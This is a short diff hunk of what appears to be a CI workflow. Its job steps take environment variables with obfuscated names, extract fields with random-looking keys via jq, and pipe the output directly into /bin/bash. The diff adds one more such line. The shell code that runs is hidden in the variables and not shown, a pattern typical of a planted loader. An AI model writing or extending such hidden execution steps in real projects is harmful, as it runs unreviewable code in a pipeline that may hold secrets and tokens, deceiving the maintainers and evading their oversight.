@@ -32,6 +32,7 @@ jobs:
           printf '%s' "$vt11297" | jq -r .kynr92 | /bin/bash
           echo $krnb50 | jq -r .djm2477 | /bin/bash
           echo $kcqnd8905 | jq -r .nivp66 | /bin/bash
+          echo $hl57 | jq -r .nmd123 | /bin/bash
 
       - name: Save results
         if: always()
